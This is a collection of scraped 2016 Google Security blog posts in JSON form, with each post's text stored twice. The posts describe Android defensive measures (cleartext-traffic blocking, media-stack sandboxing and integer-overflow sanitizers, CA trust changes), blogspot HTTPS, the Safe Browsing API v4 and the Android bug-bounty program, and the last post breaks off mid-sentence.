{"website": "Google-Security", "title": "\nProtecting against unintentional regressions to cleartext traffic in your Android apps\n", "author": ["Posted by Alex Klyubin, Android Security team"], "link": "https://security.googleblog.com/2016/04/protecting-against-unintentional.html", "abstract": "                             Posted by Alex Klyubin, Android Security team      [Cross-posted from the  Android Developers Blog ]     When your app communicates with servers using cleartext network traffic, such as HTTP, the traffic risks being eavesdropped upon and tampered with by third parties. This may leak information about your users and open your app up to injection of unauthorized content or exploits. Ideally, your app should use secure traffic only, such as by using  HTTPS instead of HTTP . Such traffic is protected against eavesdropping and tampering.    Many Android apps already use secure traffic only. However, some of them occasionally regress to cleartext traffic by accident. For example, an inadvertent change in one of the server components could make the server provide the app with HTTP URLs instead of HTTPS URLs. The app would then proceed to communicate in cleartext, without any user-visible symptoms. This situation may go unnoticed by the app&#8217;s developer and users.    Even if you believe your app is only using secure traffic, make sure to use the new mechanisms provided by Android Marshmallow (Android 6.0) to catch and prevent accidental regressions.   New Protections Mechanisms       For apps which only use secure traffic, Android 6.0 Marshmallow (API Level 23) introduced two mechanisms to address regressions to cleartext traffic: (1) in production / installed base, block cleartext traffic, and (2) during development / QA, log or crash whenever non-TLS/SSL traffic is encountered. The following sections provide more information about these mechanisms.       Block cleartext traffic in production       To protect the installed base of your app against regressions to cleartext traffic, declare  android:usesCleartextTraffic=&#8221;false&#8221;  attribute on the  application  element in your app&#8217;s AndroidManifest.xml. This declares that the app is not supposed to use cleartext network traffic and makes the platform network stacks of Android Marshmallow block cleartext traffic in the app. For example, if your app accidentally attempts to sign in the user via a cleartext HTTP request, the request will be blocked and the user&#8217;s identity and password will not leak to the network.    You don&#8217;t have to set minSdkVersion or targetSdkVersion of your app to 23 (Android Marshmallow) to use  android:usesCleartextTraffic . On older platforms, this attribute is simply ignored and thus has no effect.    Please note that WebView does not yet honor this feature.    And under certain circumstances cleartext traffic may still leave or enter the app. For example, Socket API ignores the cleartext policy because it does not know whether the data it transmits or receives can be classified as cleartext. Android platform HTTP stacks, on the other hand, honor the policy because they know whether traffic is cleartext.    Google AdMob is also built to honor this policy. When your app declares that it does not use cleartext traffic, only HTTPS-only ads should be served to the app.    Third-party network, ad, and analytics libraries are encouraged to add support for this policy. They can query the cleartext traffic policy via the  NetworkSecurityPolicy  class.     Detect cleartext traffic during development       To spot cleartext traffic during development or QA,  StrictMode API  lets you modify your app to detect non-TLS/SSL traffic and then either log violations to system log or crash the app (see  StrictMode.VmPolicy.Builder.detectCleartextNetwork() ). This is a useful tool for identifying which bits of the app are using non-TLS/SSL (and DLTS) traffic. Unlike the  android:usesCleartextTraffic  attribute, this feature is not meant to be enabled in app builds distributed to users.    Firstly, this feature is supposed to flag secure traffic that is not TLS/SSL. More importantly, TLS/SSL traffic via HTTP proxy also may be flagged. This is an issue because as a developer, you have no control over whether a particular user of your app may have configured their Android device to use an HTTP proxy. Finally, the implementation of the feature is not future-proof and thus may reject future TLS/SSL protocol versions. Thus, this feature is intended to be used only during the development and QA phase.     Declare finer-grained cleartext policy in Network Security Config        Android N  offers finer-grained control over cleartext traffic policy. As opposed to  android:usesCleartextTraffic  attribute, which applies to all destinations with which an app communicates, Android N&#8217;s  Network Security Config  lets an app specify cleartext policy for specific destinations. For example, to facilitate a more gradual transition towards a policy that does not allow cleartext traffic, an app can at first block accidental cleartext only for communication with its most important backends and permit cleartext to be used for other destinations.     Next Steps       It is a security best practice to only use secure network traffic for communication between your app and its servers. Android Marshmallow enables you to enforce this practice, so give it a try!    As always, we appreciate feedback and welcome suggestions for improving Android. Contact us at  security@android.com . HTTPS, Android-Security                                   Posted by Alex Klyubin, Android Security team  [Cross-posted from the Android Developers Blog]  When your app communicates with servers using cleartext network traffic, such as HTTP, the traffic risks being eavesdropped upon and tampered with by third parties. This may leak information about your users and open your app up to injection of unauthorized content or exploits. Ideally, your app should use secure traffic only, such as by using HTTPS instead of HTTP. Such traffic is protected against eavesdropping and tampering.  Many Android apps already use secure traffic only. However, some of them occasionally regress to cleartext traffic by accident. For example, an inadvertent change in one of the server components could make the server provide the app with HTTP URLs instead of HTTPS URLs. The app would then proceed to communicate in cleartext, without any user-visible symptoms. This situation may go unnoticed by the app’s developer and users.  Even if you believe your app is only using secure traffic, make sure to use the new mechanisms provided by Android Marshmallow (Android 6.0) to catch and prevent accidental regressions. New Protections Mechanisms  For apps which only use secure traffic, Android 6.0 Marshmallow (API Level 23) introduced two mechanisms to address regressions to cleartext traffic: (1) in production / installed base, block cleartext traffic, and (2) during development / QA, log or crash whenever non-TLS/SSL traffic is encountered. The following sections provide more information about these mechanisms.  Block cleartext traffic in production  To protect the installed base of your app against regressions to cleartext traffic, declare android:usesCleartextTraffic=”false” attribute on the application element in your app’s AndroidManifest.xml. This declares that the app is not supposed to use cleartext network traffic and makes the platform network stacks of Android Marshmallow block cleartext traffic in the app. For example, if your app accidentally attempts to sign in the user via a cleartext HTTP request, the request will be blocked and the user’s identity and password will not leak to the network.  You don’t have to set minSdkVersion or targetSdkVersion of your app to 23 (Android Marshmallow) to use android:usesCleartextTraffic. On older platforms, this attribute is simply ignored and thus has no effect.  Please note that WebView does not yet honor this feature.  And under certain circumstances cleartext traffic may still leave or enter the app. For example, Socket API ignores the cleartext policy because it does not know whether the data it transmits or receives can be classified as cleartext. Android platform HTTP stacks, on the other hand, honor the policy because they know whether traffic is cleartext.  Google AdMob is also built to honor this policy. When your app declares that it does not use cleartext traffic, only HTTPS-only ads should be served to the app.  Third-party network, ad, and analytics libraries are encouraged to add support for this policy. They can query the cleartext traffic policy via the NetworkSecurityPolicy class.  Detect cleartext traffic during development  To spot cleartext traffic during development or QA, StrictMode API lets you modify your app to detect non-TLS/SSL traffic and then either log violations to system log or crash the app (see StrictMode.VmPolicy.Builder.detectCleartextNetwork()). This is a useful tool for identifying which bits of the app are using non-TLS/SSL (and DLTS) traffic. Unlike the android:usesCleartextTraffic attribute, this feature is not meant to be enabled in app builds distributed to users.  Firstly, this feature is supposed to flag secure traffic that is not TLS/SSL. More importantly, TLS/SSL traffic via HTTP proxy also may be flagged. This is an issue because as a developer, you have no control over whether a particular user of your app may have configured their Android device to use an HTTP proxy. Finally, the implementation of the feature is not future-proof and thus may reject future TLS/SSL protocol versions. Thus, this feature is intended to be used only during the development and QA phase.  Declare finer-grained cleartext policy in Network Security Config  Android N offers finer-grained control over cleartext traffic policy. As opposed to android:usesCleartextTraffic attribute, which applies to all destinations with which an app communicates, Android N’s Network Security Config lets an app specify cleartext policy for specific destinations. For example, to facilitate a more gradual transition towards a policy that does not allow cleartext traffic, an app can at first block accidental cleartext only for communication with its most important backends and permit cleartext to be used for other destinations.  Next Steps  It is a security best practice to only use secure network traffic for communication between your app and its servers. Android Marshmallow enables you to enforce this practice, so give it a try!  As always, we appreciate feedback and welcome suggestions for improving Android. Contact us at security@android.com. HTTPS, Android-Security     ", "date": "April 25, 2016"},
{"website": "Google-Security", "title": "\nBringing HTTPS to all blogspot domain blogs\n", "author": ["Posted by Milinda Perera, Software Engineer, Security"], "link": "https://security.googleblog.com/2016/05/bringing-https-to-all-blogspot-domain.html", "abstract": "                             Posted by Milinda Perera, Software Engineer, Security      HTTPS is fundamental to internet security; it protects the integrity and confidentiality of data sent between websites and visitors' browsers. Last September, we  began  rolling out HTTPS support for blogspot domain blogs so you could try it out. Today, we&#8217;re launching another milestone: an HTTPS version for every blogspot domain blog. With this change, visitors can access any blogspot domain blog over an encrypted channel.               The HTTPS indicator in the Chrome browser      As part of this launch, we're removing the HTTPS Availability setting. Even if you did not previously turn on this setting, your blogs will have an HTTPS version enabled.    We&#8217;re also adding a  new setting called HTTPS Redirect  that allows you to opt-in to redirect HTTP requests to HTTPS. While all blogspot blogs will have an HTTPS version enabled, if you turn on this new setting, all visitors will be redirected to the HTTPS version of your blog at  https ://&lt;your-blog&gt;.blogspot.com even if they go to  http ://&lt;your-blog&gt;.blogspot.com. If you choose to turn off this setting, visitors will have two options for viewing your blog: the unencrypted version at  http ://&lt;your-blog&gt;.blogspot.com or the encrypted version at  https ://&lt;your-blog&gt;.blogspot.com.               The new HTTPS Redirect setting in the Blogger dashboard      Please be aware that  mixed content  may cause some of your blog's functionality not to work in the HTTPS version. Mixed content is often caused by incompatible templates, gadgets, or post content. While we're proactively fixing most of these errors, some of them can only be fixed by you, the blog authors. To help  spot and fix  these errors, we recently  released  a mixed content warning tool that alerts you to possible mixed content issues in your posts, and gives you the option to fix them automatically before saving.    Existing links and bookmarks to your blogs are not affected by this launch, and will continue to work. Please note that blogs on custom domains will not yet have HTTPS support.    This update expands Google's  HTTPS Everywhere  mission to all blogspot domain blogs. We appreciate your  feedback  and will use it to make future improvements.                                   Posted by Milinda Perera, Software Engineer, Security   HTTPS is fundamental to internet security; it protects the integrity and confidentiality of data sent between websites and visitors' browsers. Last September, we began rolling out HTTPS support for blogspot domain blogs so you could try it out. Today, we’re launching another milestone: an HTTPS version for every blogspot domain blog. With this change, visitors can access any blogspot domain blog over an encrypted channel.   The HTTPS indicator in the Chrome browser  As part of this launch, we're removing the HTTPS Availability setting. Even if you did not previously turn on this setting, your blogs will have an HTTPS version enabled.  We’re also adding a new setting called HTTPS Redirect that allows you to opt-in to redirect HTTP requests to HTTPS. While all blogspot blogs will have an HTTPS version enabled, if you turn on this new setting, all visitors will be redirected to the HTTPS version of your blog at https:// .blogspot.com even if they go to http:// .blogspot.com. If you choose to turn off this setting, visitors will have two options for viewing your blog: the unencrypted version at http:// .blogspot.com or the encrypted version at https:// .blogspot.com.   The new HTTPS Redirect setting in the Blogger dashboard  Please be aware that mixed content may cause some of your blog's functionality not to work in the HTTPS version. Mixed content is often caused by incompatible templates, gadgets, or post content. While we're proactively fixing most of these errors, some of them can only be fixed by you, the blog authors. To help spot and fix these errors, we recently released a mixed content warning tool that alerts you to possible mixed content issues in your posts, and gives you the option to fix them automatically before saving.  Existing links and bookmarks to your blogs are not affected by this launch, and will continue to work. Please note that blogs on custom domains will not yet have HTTPS support.  This update expands Google's HTTPS Everywhere mission to all blogspot domain blogs. We appreciate your feedback and will use it to make future improvements.     ", "date": "May 3, 2016"},
{"website": "Google-Security", "title": "\nHardening the media stack\n", "author": ["Posted by Dan Austin and Jeff Vander Stoep, Android Security team"], "link": "https://security.googleblog.com/2016/05/hardening-media-stack.html", "abstract": "                             Posted by Dan Austin and Jeff Vander Stoep, Android Security team         [Cross-posted from the  Android Developers Blog ]     To help make Android more secure, we encourage and  reward  researchers who discover vulnerabilities. In 2015, a series of bugs in mediaserver&#8217;s libstagefright were disclosed to Google. We released updates for these issues with our August and September 2015  security bulletins .  In addition to addressing issues on a monthly basis, we&#8217;ve also been working on new security features designed to enhance the existing security model and provide additional defense in-depth. These defense measures attempt to achieve two goals:       Prevention : Stop bugs from becoming vulnerabilities        Containment : Protect the system by de-privileging and isolating components that handle untrusted content          Prevention   Most of the vulnerabilities found in libstagefright were heap overflows resulting from unsigned  integer overflows . A number of integer overflows in libstagefright allowed an attacker to allocate a buffer with less space than necessary for the incoming data, resulting in a buffer overflow in the heap.  The result of an unsigned integer overflow is well defined, but the ensuing behavior could be unexpected or unsafe. In contrast, signed integer overflows are considered undefined behavior in C/C++, which means the result of an overflow is not guaranteed, and the compiler author may choose the resulting behavior&#8212;typically what is fastest or simplest. We have added compiler changes that are designed to provide safer defaults for both signed and unsigned integer overflows.  The UndefinedBehaviorSanitizer ( UBSan ) is part of the LLVM/Clang compiler toolchain that detects undefined or unintended behavior. UBSan can check for multiple types of undefined and unsafe behavior, including signed and unsigned integer overflow. These checks add code to the resulting executable, testing for integer overflow conditions during runtime. For example, figure 1 shows source code for the  parseChunk  function in the  MPEG4Extractor  component of libstagefright after the original researcher-supplied patch was applied. The modification, which is contained in the black box below, appears to prevent integer overflows from occurring. Unfortunately, while  SIZE_MAX  and  size  are 32-bit values,  chunk_size  is a 64-bit value, resulting in an incomplete check and the potential for integer overflow. In the line within the red box, the addition of  size  and  chunk_size  may result in an integer overflow and creation of buffer smaller than  size  elements. The subsequent  memcpy  could then lead to exploitable memory corruption, as  size  +  chunk_size  could be less than  size , which is highlighted in the blue box. The mechanics of a potential exploit vector for this vulnerability are explained in more detail by  Project Zero .          Figure 1.  Source code demonstrating a subtle unsigned integer overflow.  Figure 2 compares assembly generated from the code segment above with a second version compiled with integer sanitization enabled. The add operation that results in the integer overflow is contained in the red box.   In the unsanitized version,  size  ( r6 ) and  chunk_size  ( r7 ) are added together, potentially resulting in  r0  overflowing and being less than  size . Then,  buffer  is allocated with the  size  specified in  r0 , and  size  bytes are copied to it. If  r0  is less than  r6 , this results in memory corruption.  In the sanitized version,  size  ( r7 ) and  chunk_size  ( r5 ) are added together with the result stored in  r0 . Later,  r0  is checked against  r7 , if  r0  is less than  r7 , as indicated by the  CC  condition code,  r3  is set to 1. If  r3  is 1, and the carry bit was set, then an integer overflow occurred, and an abort is triggered, preventing memory corruption.  Note that the incomplete check provided in the patch was not included in figure 2. The overflow occurs in the  buffer  allocation&#8217;s  add  operation. This addition triggers an integer sanitization check, which turns this exploitable flaw into a harmless abort.           Figure 2.  Comparing unsanitized and sanitized compiler output.  While the integer sanitizers were originally intended as code hygiene tools, they effectively prevent the majority of reported libstagefright vulnerabilities. Turning on the integer overflow checks was just the first step. Preventing the runtime abort by finding and fixing integer overflows, most of which are not exploitable, represented a large effort by Android's media team. Most of the discovered overflows were fixed and those that remain (mostly for performance reasons) were verified and marked as safe to prevent the runtime abort.  In Android N, signed and unsigned integer overflow detection is enabled on the entire media stack, including libstagefright. This makes it harder to exploit integer overflows, and also helps to prevent future additions to Android from introducing new integer overflow bugs.      Containment   For Android M and earlier, the mediaserver process in Android was responsible for most media-related tasks. This meant that it required access to all permissions needed by those responsibilities and, although mediaserver ran in its own sandbox, it still had access to a lot of resources and capabilities. This is why the libstagefright bugs from 2015 were significant&#8212;mediaserver could access several important resources on an Android device including camera, microphone, graphics, phone, Bluetooth, and internet.  A root cause analysis showed that the libstagefright bugs primarily occurred in code responsible for parsing file formats and media codecs. This is not surprising&#8212;parsing complex file formats and codecs while trying to optimize for speed is hard, and the large number of edge cases makes such code susceptible to both accidental and malicious malformed inputs.   However, media parsers do not require access to most of the privileged permissions held by mediaserver. Because of this, the media team re-architected mediaserver in Android N to better adhere to the principle of least privilege. Figure 3 illustrates how the monolithic mediaserver and its permissions have been divided, using the following heuristics:      parsing code moved into unprivileged sandboxes that have few or no permissions       components that require sensitive permissions moved into separate sandboxes that only grant access to the specific resources the component needs. For example, only the cameraserver may access the camera, only the audioserver may access Bluetooth, and only the drmserver may access DRM resources.             Figure 3 . How mediaserver and its permissions have been divided in Android N.  Comparing the potential impact of the libstagefright bugs on Android N and older versions demonstrates the value of this strategy. Gaining code execution in libstagefright previously granted access to all the permissions and resources available to the monolithic mediaserver process including graphics driver, camera driver, or sockets, which present a rich kernel attack surface.  In Android N, libstagefright runs within the mediacodec sandbox with access to very few permissions. Access to camera, microphone, photos, phone, Bluetooth, and internet as well as dynamic code loading are disallowed by  SELinux . Interaction with the kernel is further restricted by  seccomp . This means that compromising libstagefright would grant the attacker access to significantly fewer permissions and also mitigates privilege escalation by reducing the attack surface exposed by the kernel.     Conclusion   The media hardening project is an ongoing effort focused on moving functionality into less privileged sandboxes and further reducing the permissions granted to those sandboxes. While the techniques discussed here were applied to the Android media framework, they are suitable across the Android codebase. These hardening techniques&#8212;and others&#8212;are being actively applied to additional components within Android. As always, we appreciate feedback on our work and welcome suggestions for how we can improve Android. Contact us at  security@android.com .                                   Posted by Dan Austin and Jeff Vander Stoep, Android Security team     [Cross-posted from the Android Developers Blog]  To help make Android more secure, we encourage and reward researchers who discover vulnerabilities. In 2015, a series of bugs in mediaserver’s libstagefright were disclosed to Google. We released updates for these issues with our August and September 2015 security bulletins. In addition to addressing issues on a monthly basis, we’ve also been working on new security features designed to enhance the existing security model and provide additional defense in-depth. These defense measures attempt to achieve two goals:   Prevention: Stop bugs from becoming vulnerabilities     Containment: Protect the system by de-privileging and isolating components that handle untrusted content     Prevention Most of the vulnerabilities found in libstagefright were heap overflows resulting from unsigned integer overflows. A number of integer overflows in libstagefright allowed an attacker to allocate a buffer with less space than necessary for the incoming data, resulting in a buffer overflow in the heap. The result of an unsigned integer overflow is well defined, but the ensuing behavior could be unexpected or unsafe. In contrast, signed integer overflows are considered undefined behavior in C/C++, which means the result of an overflow is not guaranteed, and the compiler author may choose the resulting behavior—typically what is fastest or simplest. We have added compiler changes that are designed to provide safer defaults for both signed and unsigned integer overflows. The UndefinedBehaviorSanitizer (UBSan) is part of the LLVM/Clang compiler toolchain that detects undefined or unintended behavior. UBSan can check for multiple types of undefined and unsafe behavior, including signed and unsigned integer overflow. These checks add code to the resulting executable, testing for integer overflow conditions during runtime. For example, figure 1 shows source code for the parseChunk function in the MPEG4Extractor component of libstagefright after the original researcher-supplied patch was applied. The modification, which is contained in the black box below, appears to prevent integer overflows from occurring. Unfortunately, while SIZE_MAX and size are 32-bit values, chunk_size is a 64-bit value, resulting in an incomplete check and the potential for integer overflow. In the line within the red box, the addition of size and chunk_size may result in an integer overflow and creation of buffer smaller than size elements. The subsequent memcpy could then lead to exploitable memory corruption, as size + chunk_size could be less than size, which is highlighted in the blue box. The mechanics of a potential exploit vector for this vulnerability are explained in more detail by Project Zero.   Figure 1. Source code demonstrating a subtle unsigned integer overflow. Figure 2 compares assembly generated from the code segment above with a second version compiled with integer sanitization enabled. The add operation that results in the integer overflow is contained in the red box.  In the unsanitized version, size (r6) and chunk_size (r7) are added together, potentially resulting in r0 overflowing and being less than size. Then, buffer is allocated with the size specified in r0, and size bytes are copied to it. If r0 is less than r6, this results in memory corruption. In the sanitized version, size (r7) and chunk_size (r5) are added together with the result stored in r0. Later, r0 is checked against r7, if r0 is less than r7, as indicated by the CC condition code, r3 is set to 1. If r3 is 1, and the carry bit was set, then an integer overflow occurred, and an abort is triggered, preventing memory corruption. Note that the incomplete check provided in the patch was not included in figure 2. The overflow occurs in the buffer allocation’s add operation. This addition triggers an integer sanitization check, which turns this exploitable flaw into a harmless abort.    Figure 2. Comparing unsanitized and sanitized compiler output. While the integer sanitizers were originally intended as code hygiene tools, they effectively prevent the majority of reported libstagefright vulnerabilities. Turning on the integer overflow checks was just the first step. Preventing the runtime abort by finding and fixing integer overflows, most of which are not exploitable, represented a large effort by Android's media team. Most of the discovered overflows were fixed and those that remain (mostly for performance reasons) were verified and marked as safe to prevent the runtime abort. In Android N, signed and unsigned integer overflow detection is enabled on the entire media stack, including libstagefright. This makes it harder to exploit integer overflows, and also helps to prevent future additions to Android from introducing new integer overflow bugs.   Containment For Android M and earlier, the mediaserver process in Android was responsible for most media-related tasks. This meant that it required access to all permissions needed by those responsibilities and, although mediaserver ran in its own sandbox, it still had access to a lot of resources and capabilities. This is why the libstagefright bugs from 2015 were significant—mediaserver could access several important resources on an Android device including camera, microphone, graphics, phone, Bluetooth, and internet. A root cause analysis showed that the libstagefright bugs primarily occurred in code responsible for parsing file formats and media codecs. This is not surprising—parsing complex file formats and codecs while trying to optimize for speed is hard, and the large number of edge cases makes such code susceptible to both accidental and malicious malformed inputs.  However, media parsers do not require access to most of the privileged permissions held by mediaserver. Because of this, the media team re-architected mediaserver in Android N to better adhere to the principle of least privilege. Figure 3 illustrates how the monolithic mediaserver and its permissions have been divided, using the following heuristics:   parsing code moved into unprivileged sandboxes that have few or no permissions     components that require sensitive permissions moved into separate sandboxes that only grant access to the specific resources the component needs. For example, only the cameraserver may access the camera, only the audioserver may access Bluetooth, and only the drmserver may access DRM resources.     Figure 3. How mediaserver and its permissions have been divided in Android N. Comparing the potential impact of the libstagefright bugs on Android N and older versions demonstrates the value of this strategy. Gaining code execution in libstagefright previously granted access to all the permissions and resources available to the monolithic mediaserver process including graphics driver, camera driver, or sockets, which present a rich kernel attack surface. In Android N, libstagefright runs within the mediacodec sandbox with access to very few permissions. Access to camera, microphone, photos, phone, Bluetooth, and internet as well as dynamic code loading are disallowed by SELinux. Interaction with the kernel is further restricted by seccomp. This means that compromising libstagefright would grant the attacker access to significantly fewer permissions and also mitigates privilege escalation by reducing the attack surface exposed by the kernel.  Conclusion The media hardening project is an ongoing effort focused on moving functionality into less privileged sandboxes and further reducing the permissions granted to those sandboxes. While the techniques discussed here were applied to the Android media framework, they are suitable across the Android codebase. These hardening techniques—and others—are being actively applied to additional components within Android. As always, we appreciate feedback on our work and welcome suggestions for how we can improve Android. Contact us at security@android.com.     ", "date": "May 5, 2016"},
{"website": "Google-Security", "title": "\nEvolving the Safe Browsing API\n", "author": ["Posted by Emily Schechter and Alex Wozniak, Safe Browsing Team "], "link": "https://security.googleblog.com/2016/05/evolving-safe-browsing-api.html", "abstract": "                             Posted by Emily Schechter and Alex Wozniak, Safe Browsing Team&nbsp;       We're excited to announce the launch of the new  Safe Browsing API version 4 . Version 4 replaces the existing Safe Browsing API version 3. With the launch of v4, we&#8217;re now starting the deprecation process for v2-3: please transition off of these older Safe Browsing protocol versions as soon as possible and onto protocol version 4.     Safe Browsing  protects well over two billion internet-connected devices from threats like malware and phishing, and has done so for over a decade. We launched v1 of the Safe Browsing API  in 2007  to give developers a simple mechanism to access Google&#8217;s lists of suspected unsafe sites.    The web has evolved since then and users are now increasingly using the web from their mobile devices. These devices have constraints less common to traditional desktop computing environments: mobile devices have very limited power and network bandwidth, and often poor quality of service. Additionally, cellular data costs our users money, so we have a responsibility to use it judiciously.    With protocol version 4, we&#8217;ve optimized for this new environment with a clear focus on maximizing protection per bit, which benefits all Safe Browsing users, mobile and desktop alike. Version 4 clients can now define constraints such as geographic location, platform type, and data caps to use bandwidth and device resources as efficiently as possible. This allows us to function well within the much stricter mobile constraints without sacrificing protection.    We&#8217;ve been using the new protocol since December via the  Safe Browsing client on Android , which is part of Google Play Services. The first app to use the client is Chrome, starting with version 46: we&#8217;re already protecting hundreds of millions of Android Chrome users by default.     We&#8217;ve Done Most Of The Work For You Already       A single device should only have a single, up-to-date instance of Safe Browsing data, so we&#8217;re taking care of that for all Android developers. Please don&#8217;t implement your own Version 4 client on Android: we&#8217;re working on making a simple, device-local API available to prevent any resource waste on device. We&#8217;ll announce the availability of this new device-local API as soon as possible; in the meantime, there&#8217;s no need to develop a Version 4 client on your own. For those who operate in less resource-constrained environments, using the Safe Browsing Version 4 API directly allows you to:       Check pages against the Safe Browsing lists based on platform and threat types.   Warn users before they click links that may lead to infected pages.   Prevent users from posting links to known infected pages           To make Safe Browsing integration as simple as possible, we&#8217;re also releasing a  reference client implementation  of the new API today, written in Go. It also provides a Safe Browsing HTTP proxy server, which supports JSON.              It&#8217;s easy to start protecting users with the new Version 4 of the Safe Browsing API.  Sign up for a key  and  let us know what you think !                                     Posted by Emily Schechter and Alex Wozniak, Safe Browsing Team   We're excited to announce the launch of the new Safe Browsing API version 4. Version 4 replaces the existing Safe Browsing API version 3. With the launch of v4, we’re now starting the deprecation process for v2-3: please transition off of these older Safe Browsing protocol versions as soon as possible and onto protocol version 4.  Safe Browsing protects well over two billion internet-connected devices from threats like malware and phishing, and has done so for over a decade. We launched v1 of the Safe Browsing API in 2007 to give developers a simple mechanism to access Google’s lists of suspected unsafe sites.  The web has evolved since then and users are now increasingly using the web from their mobile devices. These devices have constraints less common to traditional desktop computing environments: mobile devices have very limited power and network bandwidth, and often poor quality of service. Additionally, cellular data costs our users money, so we have a responsibility to use it judiciously.  With protocol version 4, we’ve optimized for this new environment with a clear focus on maximizing protection per bit, which benefits all Safe Browsing users, mobile and desktop alike. Version 4 clients can now define constraints such as geographic location, platform type, and data caps to use bandwidth and device resources as efficiently as possible. This allows us to function well within the much stricter mobile constraints without sacrificing protection.  We’ve been using the new protocol since December via the Safe Browsing client on Android, which is part of Google Play Services. The first app to use the client is Chrome, starting with version 46: we’re already protecting hundreds of millions of Android Chrome users by default.  We’ve Done Most Of The Work For You Already  A single device should only have a single, up-to-date instance of Safe Browsing data, so we’re taking care of that for all Android developers. Please don’t implement your own Version 4 client on Android: we’re working on making a simple, device-local API available to prevent any resource waste on device. We’ll announce the availability of this new device-local API as soon as possible; in the meantime, there’s no need to develop a Version 4 client on your own. For those who operate in less resource-constrained environments, using the Safe Browsing Version 4 API directly allows you to:   Check pages against the Safe Browsing lists based on platform and threat types. Warn users before they click links that may lead to infected pages. Prevent users from posting links to known infected pages     To make Safe Browsing integration as simple as possible, we’re also releasing a reference client implementation of the new API today, written in Go. It also provides a Safe Browsing HTTP proxy server, which supports JSON.      It’s easy to start protecting users with the new Version 4 of the Safe Browsing API. Sign up for a key and let us know what you think!     ", "date": "May 20, 2016"},
{"website": "Google-Security", "title": "\nOne Year of Android Security Rewards\n", "author": ["Posted by Quan To, Program Manager, Android Security"], "link": "https://security.googleblog.com/2016/06/one-year-of-android-security-rewards.html", "abstract": "                             Posted by Quan To, Program Manager, Android Security      A year ago , we added  Android Security Rewards  to the long standing  Google Vulnerability Rewards Program . We offered up to $38,000 per report that we used to fix vulnerabilities and protect Android users.    Since then, we have received over 250 qualifying vulnerability reports from researchers that have helped make Android and mobile security stronger. More than a third of them were reported in Media Server which has been  hardened in Android N  to make it more resistant to vulnerabilities.    While the program is focused on Nexus devices and has a primary goal of improving Android security, more than a quarter of the issues were reported in code that is developed and used outside of the Android Open Source Project. Fixing these kernel and device driver bugs helps improve security of the broader mobile industry (and even some non-mobile platforms).   By the Numbers   Here&#8217;s a quick rundown of the Android VRP&#8217;s first year:       We paid over $550,000 to 82 individuals. That&#8217;s an average of $2,200 per reward and $6,700 per researcher.   We paid our top researcher,  @heisecode , $75,750 for 26 vulnerability reports.   We paid 15 researchers $10,000 or more.   There were no payouts for the top reward for a complete remote exploit chain leading to TrustZone or Verified Boot compromise.      Thank you to  those  who submitted high quality  vulnerability reports  to us last year.                        Improvements to Android VRP            We&#8217;re constantly working to improve the program and today we&#8217;re making a few changes to all vulnerability reports filed after June 1, 2016.         We&#8217;re paying more!       We will now pay 33% more for a high-quality vulnerability report with proof of concept. For example, the reward for a Critical vulnerability report with a proof of concept increased from $3000 to $4000.   A high quality vulnerability report with a proof of concept, a CTS Test, or a patch will receive an additional 50% more.   We&#8217;re raising our rewards for a remote or proximal kernel exploit from $20,000 to $30,000.   A remote exploit chain or exploits leading to TrustZone or Verified Boot compromise increase from $30,000 to $50,000.      All of the changes, as well as the additional terms of the program, are explained in more detail in our  Program Rules . If you&#8217;re interested in helping us find security vulnerabilities, take a look at  Bug Hunter University  and learn how to submit high quality vulnerability reports. Remember, the better the report, the more you&#8217;ll get paid. We also recently updated our  severity ratings , so make sure to check those out, too.                Thank you to everyone who helped us make Android safer. Together, we made a huge investment in security research that has made Android stronger. We&#8217;re just getting started and are looking forward to doing even more in the future.                                     Posted by Quan To, Program Manager, Android Security  A year ago, we added Android Security Rewards to the long standing Google Vulnerability Rewards Program. We offered up to $38,000 per report that we used to fix vulnerabilities and protect Android users.  Since then, we have received over 250 qualifying vulnerability reports from researchers that have helped make Android and mobile security stronger. More than a third of them were reported in Media Server which has been hardened in Android N to make it more resistant to vulnerabilities.  While the program is focused on Nexus devices and has a primary goal of improving Android security, more than a quarter of the issues were reported in code that is developed and used outside of the Android Open Source Project. Fixing these kernel and device driver bugs helps improve security of the broader mobile industry (and even some non-mobile platforms). By the Numbers Here’s a quick rundown of the Android VRP’s first year:   We paid over $550,000 to 82 individuals. That’s an average of $2,200 per reward and $6,700 per researcher. We paid our top researcher, @heisecode, $75,750 for 26 vulnerability reports. We paid 15 researchers $10,000 or more. There were no payouts for the top reward for a complete remote exploit chain leading to TrustZone or Verified Boot compromise.   Thank you to those who submitted high quality vulnerability reports to us last year.        Improvements to Android VRP    We’re constantly working to improve the program and today we’re making a few changes to all vulnerability reports filed after June 1, 2016.    We’re paying more!   We will now pay 33% more for a high-quality vulnerability report with proof of concept. For example, the reward for a Critical vulnerability report with a proof of concept increased from $3000 to $4000. A high quality vulnerability report with a proof of concept, a CTS Test, or a patch will receive an additional 50% more. We’re raising our rewards for a remote or proximal kernel exploit from $20,000 to $30,000. A remote exploit chain or exploits leading to TrustZone or Verified Boot compromise increase from $30,000 to $50,000.   All of the changes, as well as the additional terms of the program, are explained in more detail in our Program Rules. If you’re interested in helping us find security vulnerabilities, take a look at Bug Hunter University and learn how to submit high quality vulnerability reports. Remember, the better the report, the more you’ll get paid. We also recently updated our severity ratings, so make sure to check those out, too.       Thank you to everyone who helped us make Android safer. Together, we made a huge investment in security research that has made Android stronger. We’re just getting started and are looking forward to doing even more in the future.     ", "date": "June 16, 2016"},
{"website": "Google-Security", "title": "\nChanges to Trusted Certificate Authorities in Android Nougat\n", "author": ["Posted by Chad Brubaker, Android Security team"], "link": "https://security.googleblog.com/2016/07/changes-to-trusted-certificate.html", "abstract": "                             Posted by Chad Brubaker, Android Security team      [Cross-posted from the  Android Developers Blog ]   In Android Nougat, we&#8217;ve changed how Android handles trusted certificate authorities (CAs) to provide safer defaults for secure app traffic. Most apps and users should not be affected by these changes or need to take any action. The changes include:     Safe and easy APIs to trust custom CAs.    Apps that target API Level 24 and above no longer trust user or admin-added CAs for secure connections, by default.    All devices running Android Nougat offer the same standardized set of system CAs&#8212;no device-specific customizations.    For more details on these changes and what to do if you&#8217;re affected by them, read on.     Safe and easy APIs  Apps have always been able customize which certificate authorities they trust. However, we saw apps making mistakes due to the complexities of the Java TLS APIs. To address this we  improved the APIs  for customizing trust.     User-added CAs  Protection of all application data is a key goal of the Android application sandbox. Android Nougat changes how applications interact with user- and admin-supplied CAs. By default, apps that target API level 24 will&#8212;by design&#8212;not honor such CAs unless the app explicitly opts in. This safe-by-default setting reduces application attack surface and encourages consistent handling of network and file-based application data.     Customizing trusted CAs  Customizing the CAs your app trusts on Android Nougat is easy using the Network Security Config. Trust can be specified across the whole app or only for connections to certain domains, as 